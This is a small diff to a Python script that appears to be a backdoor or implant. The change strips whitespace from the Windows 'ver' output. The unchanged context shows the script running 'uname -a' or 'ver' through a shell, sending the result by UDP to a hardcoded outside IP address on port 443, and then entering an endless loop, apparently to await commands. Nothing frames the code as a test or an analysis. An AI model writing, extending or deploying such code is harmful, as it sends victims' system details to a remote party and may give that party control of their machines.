@@ -6,7 +6,7 @@ try:
 	try:
 		uname = subprocess.check_output('uname -a', shell=True)
 	except subprocess.CalledProcessError:
-		uname = subprocess.check_output('ver', shell=True)
+		uname = subprocess.check_output('ver', shell=True).lstrip()
 			
 	sock.sendto(uname, ('68.183.187.166', 443))
 	while True:
